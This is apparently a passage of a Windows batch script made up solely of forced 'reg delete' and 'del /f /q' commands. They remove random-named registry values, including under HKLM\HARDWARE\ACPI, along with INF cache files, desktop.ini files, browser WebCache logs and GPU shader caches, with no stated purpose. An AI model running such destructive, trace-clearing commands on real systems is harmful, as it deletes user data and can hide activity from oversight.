reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\InputPersonalization" /v "iU1b6GvS1TiZ" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Connection Wizard" /v "F3YxVeBJK" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer" /v "I6BDvjwRgw6eX3a" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Keyboard" /v "qOpaZDAqyR" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\LanguageOverlay" /v "tBHYf2FpMSsvHgo" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\MediaPlayer" /v "DFDHnZw3L1" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Microsoft Management Console" /v "XjmxEHys" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\MSF" /v "PJe5AhAz" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Multimedia" /v "cxwTJIK38D" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Narrator" /v "l9nTdejMgZ" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\NGC" /v "ACuTi9DM5uXp9f" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Notepad" /v "ZWwjV3" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Nucleus" /v "00ZEPd" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\OneDrive" /v "T9cZ93mG" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Osk" /v "vFnijwndit6Bb" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\PeerNet" /v "ptnzsTGlZHvojW" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Personalization" /v "a2vQfNw0Kkib" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Phone" /v "CN8tTeV" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Pim" /v "HQNTkRuv0Hc" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Poom" /v "xfkPrCtcI90Gp" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\RAS AutoDial" /v "mPW6Yl2M9LhIU3F" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\RAS Phonebook" /v "BXCBZ37CFjIy9" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Remote Assistance" /v "MvfoH1VDKMYcf" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier" /v "VSgoKEV" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Sensors" /v "uOR03" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\SkyDrive" /v "QFt7EeMp9cd" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Speech" /v "XoJil2J" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Speech Virtual" /v "ZIwWsOrk" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Speech_OneCore" /v "aTgyKnutVL7pd" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Spelling" /v "jFkhMJ9N1" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\SQMClient" /v "rfwmOZGylOWSP" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\StigRegKey" /v "sRaUwIQjMDtCJ" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\SystemCertificates" /v "BawfSWL3TtuQP2t" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\TabletTip" /v "6Q5IJB1U" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m1v" /v "nb6hFmvUR6NZo9" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m2t" /v "89CmH" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m2ts" /v "tmzqU5sNZ8KXP" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m2v" /v "KotgKDM" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m3u" /v "YfJ9zyHTbCT79" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m3u8" /v "rGsRiYKLXdQrqTD" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m4a" /v "b2j4xTLI" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m4r" /v "Na0vyQmHMHv" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.m4v" /v "X4nopK0o5" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mdc" /v "1Va9BBBj" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mef" /v "Er4uis42nxhW" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mk3d" /v "hD6Z6bj8qIiwmZr" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mka" /v "yRzUVBu" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mkv" /v "1o0AagGwTPE" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mod" /v "DXvhyeUzfKtepC" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mos" /v "By6oisO" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mov" /v "stJKiya5" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mp2" /v "QebqDwFfmv" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mp2v" /v "zxaOIRk6uTeNuY" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mp3" /v "tvXptI" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mp4" /v "ELFsUD" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mp4v" /v "57ohfe8pVS51y" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mpa" /v "xqfaMeu3B5syb" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mpe" /v "6rBfgiuujLnk9w1" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mpeg" /v "kEd59kUeriQvdO" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mpg" /v "jfAtIJLQZ" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mpg4" /v "vrQoDTciQ1E" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mpv2" /v "LM1dtVjhna5fc39" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mrw" /v "gYMsX0ldgDYOoXG" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.ms-lockscreencomponent-primary" /v "UoLVx6d96DO" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.msix" /v "1ZsARy" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.msixbundle" /v "Tfr3WnGp1F3l0Zg" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.mts" /v "gnUvzwgQJOVOp6E" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.nef" /v "wA60YgUoj75Lrn8" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.note" /v "T7DkWk" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.nrw" /v "1dDqC" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.obj" /v "aYJGlJJQ5" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.oga" /v "EU05Di1" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.ogg" /v "WCKVjd1" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.ogm" /v "M7YVG" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.ogv" /v "HnO6J3WSgsAv" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.ogx" /v "ofi3jZFZpay8" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.raf" /v "pT0NLnfF82RpE4" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.raw" /v "ArzLZ8oo75Z0" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.rw2" /v "Gt404c" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.rwl" /v "MkSx0GiXrHRl" /
reg delete "HKEY_CURRENT_USER\Software\Classes\.rwz" /v "0IVr0WZ" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.solitairetheme8" /v "0a8Na1Czu2zzye6" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.sr2" /v "L9oTr" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.srf" /v "fTDntxeNsXhNyhR" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.srw" /v "DIag95oikAosBS" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.stl" /v "bYLRqA" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.thumb" /v "Tmvk9VjDGKO3y" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.tif" /v "IxxC4qZp" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.tiff" /v "UzI0M" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.tod" /v "tdI0QMVC" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.ts" /v "7DwNoV" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.tts" /v "nfFHwv" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.vcf" /v "fBatCfz" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.wav" /v "N3C6XPWw35bxE" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.wdp" /v "zRBumJa2qu" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.webm" /v "kvcVVmsAqZ8XCKa" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.webp" /v "DKcbd2" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.whiteboard" /v "tNle7p95" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.winget" /v "3iOUK4rfF" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.wm" /v "1F1lGKI9" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.wma" /v "qbH0tZLyB" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.wmv" /v "9Qgft" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.wpl" /v "qH42KmHtja2TkwC" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.wsb" /v "r6G8stI" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\.x3f" /v "vDbbTnTXY" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\mswindowsvideo" /v "1H8fW9FHPHXI" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\msxbox" /v "xdmbXy2e" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\NucleusNativeMessaging.NucleusNativeMessaging" /v "60xXSxFX" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\NucleusNativeMessaging.NucleusNativeMessaging.1" /v "inMN4k4DC" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\NucleusToastActivator.NucleusToastActivator" /v "eApBP3CV" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\NucleusToastActivator.NucleusToastActivator.1" /v "utyG0WbRy3v" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\odopen" /v "da6vZ" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\OneDrive.CameraRoll.Import" /v "CCv19xXLu1ix" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\onenote" /v "xI4O7CCX" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\onenote-cmd" /v "F43RJw" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\onenote-uwp" /v "6FvcJM" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\OOBERequestHandler.OOBERequestHandler" /v "YpUEaDNu4LG" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\OOBERequestHandler.OOBERequestHandler.1" /v "TtpeIrzIuIV" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\outlookaccounts" /v "gkGFeuRiqIRU" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\outlookcal" /v "R34el6L2cX2tV" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\outlookmail" /v "h4v2MC3Fu47weDH" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\overwolf-extension-ekhcackbfanheaceicpfmhmmeojplojfgkmfnpjo" /v "Ovr8ygN7oZ8" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\overwolf-support" /v "mASIzapg4V" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\overwolfstore" /v "xo0HM3khMO2w" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\PackagedCom" /v "K9V7a0FPSIylzL" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\ProcMon.Logfile.1" /v "Tqqc1" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\read" /v "4i9PtL4eNaV1o" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\roblox" /v "twKyR8N" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\roblox-player" /v "UmROxSaYfw" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\roblox-studio" /v "tMNXOl3tLc61" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\skype" /v "aAkhq6MMQ" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\skype-meetnow" /v "V7u94SbsSd" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\skypewin" /v "fb3D0OmcEv9FZg8" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\sms" /v "hyitHrkKVrDn" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\spotify" /v "iPvmGxlRFVvzI5" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\steam" /v "gnvw2uIYC4" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\steamlink" /v "75j1gJoX3" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\SyncEngineEnumeratorProvider.SyncEngineEnumeratorProvider" /v "j3FVR9ff" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\SyncEngineEnumeratorProvider.SyncEngineEnumeratorProvider.1" /v "QjgYxnOZ7b2n" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\SyncEngineFileInfoProvider.SyncEngineFileInfoProvider" /v "qG2AAgUT" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\SyncEngineFileInfoProvider.SyncEngineFileInfoProvider.1" /v "quGql20nD1NhG7" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\SyncEngineStorageProviderHandlerProxy.SyncEngineStorageProviderHandlerProxy" /v "xAjPPbV" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\SyncEngineStorageProviderHandlerProxy.SyncEngineStorageProviderHandlerProxy.1" /v "Eh4Cwew4Hs" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\tel" /v "Z1pJZC0CaOV" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\TypeLib" /v "9CqY4u7kX1LeRJ" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\windows-feedback" /v "1gO7TupSYGgv" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\windowsdefender" /v "DdH08NT9F" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\WOW6432Node" /v "iXMUwmu" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\wp-autoplay" /v "yfdcJOdus84" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbls" /v "TmfwgU2SzCBNqi" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox" /v "SqmPk5kbPq" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-arena" /v "EsBFlQO" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-captures" /v "i4P7pG" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-friendfinder" /v "qXJYXefUTYaM6iW" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-gamehub" /v "kGfyamGqsZpKlBG" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-lfg" /v "O2hjs3f7ILW5G" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-network" /v "1YtCSvPCv" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-profile" /v "X9FsrQYMF0N" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-settings" /v "fixr5Lk06yE2" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-store" /v "22QWzryqJ" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xbox-tcui" /v "K7tTKIZ" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xboxgames" /v "nIU4h" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xboxidp" /v "FDkZAxbg3QL" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xboxliveapp-1297287741" /v "e0TS5o8" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\xboxmusic" /v "beslOvuCd" /f
reg delete "HKEY_CURRENT_USER\Software\Classes\zune" /v "sQJbeDE3SSWkMYK" /f
reg delete "HKEY_LOCAL_MACHINE\HARDWARE\ACPI" /v "IV9Sfu3B2" /f
reg delete "HKEY_LOCAL_MACHINE\HARDWARE\ACPI\DSDT" /v "tTlYpwcZs" /f
reg delete "HKEY_LOCAL_MACHINE\HARDWARE\ACPI\FACS" /v "jLmuMWx5pIKdN" /f
reg delete "HKEY_LOCAL_MACHINE\HARDWARE\ACPI\FADT" /v "CnxCl" /f
if exist "C:\Windows\INF\vdrvroot.PNF" del /f /q "C:\Windows\INF\vdrvroot.PNF"
if exist "C:\Windows\INF\vhdmp.PNF" del /f /q "C:\Windows\INF\vhdmp.PNF"
if exist "C:\Windows\INF\virtdisk.PNF" del /f /q "C:\Windows\INF\virtdisk.PNF"
if exist "C:\Windows\INF\volmgr.PNF" del /f /q "C:\Windows\INF\volmgr.PNF"
if exist "C:\Windows\INF\volsnap.PNF" del /f /q "C:\Windows\INF\volsnap.PNF"
if exist "C:\Windows\INF\volume.PNF" del /f /q "C:\Windows\INF\volume.PNF"
if exist "C:\Windows\INF\vrd.PNF" del /f /q "C:\Windows\INF\vrd.PNF"
if exist "C:\Windows\INF\vsmraid.PNF" del /f /q "C:\Windows\INF\vsmraid.PNF"
if exist "C:\Windows\INF\vstxraid.PNF" del /f /q "C:\Windows\INF\vstxraid.PNF"
if exist "C:\Windows\INF\wdmaudio.PNF" del /f /q "C:\Windows\INF\wdmaudio.PNF"
if exist "C:\Windows\INF\wdma_usb.PNF" del /f /q "C:\Windows\INF\wdma_usb.PNF"
if exist "C:\Windows\INF\wdmvsc.PNF" del /f /q "C:\Windows\INF\wdmvsc.PNF"
if exist "C:\Windows\INF\wgencounter.PNF" del /f /q "C:\Windows\INF\wgencounter.PNF"
if exist "C:\Windows\INF\whvcrash.PNF" del /f /q "C:\Windows\INF\whvcrash.PNF"
if exist "C:\Windows\INF\whyperkbd.PNF" del /f /q "C:\Windows\INF\whyperkbd.PNF"
if exist "C:\Windows\INF\WindowsTrustedRTProxy.PNF" del /f /q "C:\Windows\INF\WindowsTrustedRTProxy.PNF"
if exist "C:\Windows\INF\winusb.PNF" del /f /q "C:\Windows\INF\winusb.PNF"
if exist "C:\Windows\INF\wmiacpi.PNF" del /f /q "C:\Windows\INF\wmiacpi.PNF"
if exist "C:\Windows\INF\wnetvsc.PNF" del /f /q "C:\Windows\INF\wnetvsc.PNF"
if exist "C:\Windows\INF\wpdfs.PNF" del /f /q "C:\Windows\INF\wpdfs.PNF"
if exist "C:\Windows\INF\ws3cap.PNF" del /f /q "C:\Windows\INF\ws3cap.PNF"
if exist "C:\Windows\INF\wsdprint.PNF" del /f /q "C:\Windows\INF\wsdprint.PNF"
if exist "C:\Windows\INF\wstorflt.PNF" del /f /q "C:\Windows\INF\wstorflt.PNF"
if exist "C:\Windows\INF\wstorvsc.PNF" del /f /q "C:\Windows\INF\wstorvsc.PNF"
if exist "C:\Windows\INF\wsynth3dvsc.PNF" del /f /q "C:\Windows\INF\wsynth3dvsc.PNF"
if exist "C:\Windows\INF\wvid.PNF" del /f /q "C:\Windows\INF\wvid.PNF"
if exist "C:\Windows\INF\wvmbus.PNF" del /f /q "C:\Windows\INF\wvmbus.PNF"
if exist "C:\Windows\INF\wvmbushid.PNF" del /f /q "C:\Windows\INF\wvmbushid.PNF"
if exist "C:\Windows\INF\wvmbusvideo.PNF" del /f /q "C:\Windows\INF\wvmbusvideo.PNF"
if exist "C:\Windows\INF\wvmgid.PNF" del /f /q "C:\Windows\INF\wvmgid.PNF"
if exist "C:\Windows\INF\wvpci.PNF" del /f /q "C:\Windows\INF\wvpci.PNF"
if exist "C:\Windows\INF\xboxgip.PNF" del /f /q "C:\Windows\INF\xboxgip.PNF"
if exist "C:\Windows\INF\xinputhid.PNF" del /f /q "C:\Windows\INF\xinputhid.PNF"
if exist "C:\Windows\INF\xusb22.PNF" del /f /q "C:\Windows\INF\xusb22.PNF"
if exist "C:\Users\%USERNAME%\Desktop\desktop.ini" del /f /q "C:\Users\%USERNAME%\Desktop\desktop.ini"
if exist "C:\Users\%USERNAME%\Documents\desktop.ini" del /f /q "C:\Users\%USERNAME%\Documents\desktop.ini"
if exist "C:\Users\%USERNAME%\Downloads\desktop.ini" del /f /q "C:\Users\%USERNAME%\Downloads\desktop.ini"
if exist "C:\Users\%USERNAME%\Music\desktop.ini" del /f /q "C:\Users\%USERNAME%\Music\desktop.ini"
if exist "C:\Users\%USERNAME%\OneDrive\desktop.ini" del /f /q "C:\Users\%USERNAME%\OneDrive\desktop.ini"
if exist "C:\Users\%USERNAME%\Pictures\desktop.ini" del /f /q "C:\Users\%USERNAME%\Pictures\desktop.ini"
if exist "C:\Users\%USERNAME%\Videos\desktop.ini" del /f /q "C:\Users\%USERNAME%\Videos\desktop.ini"
if exist "C:\Users\%USERNAME%\ntuser.ini" del /f /q "C:\Users\%USERNAME%\ntuser.ini"
if exist "C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe" del /f /q "C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe"
if exist "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK" del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK"
if exist "C:\Users\%USERNAME%\AppData\Local\IconCache.db" del /f /q "C:\Users\%USERNAME%\AppData\Local\IconCache.db"
if exist "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V01.chk" del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V01.chk"
if exist "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V0100041.log" del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V0100041.log"
if exist "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V0100042.log" del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V0100042.log"
if exist "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V0100043.log" del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V0100043.log"
if exist "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V01res00001.jrs" del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V01res00001.jrs"
if exist "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V01res00002.jrs" del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\WebCache\V01res00002.jrs"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_15896750efcba3d6_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_15896750efcba3d6_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_47ed48418ad75076_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_47ed48418ad75076_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_47ed48418ad75076_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_47ed48418ad75076_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_47ed48418ad75076_0_3.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_47ed48418ad75076_0_3.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_47ed48418ad75076_0_3.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_47ed48418ad75076_0_3.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_0_3.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_0_3.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_0_3.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_0_3.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_1_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_1_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_1_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_1_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_2_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_2_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_2_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_2_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_3_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_3_0.0.bin"
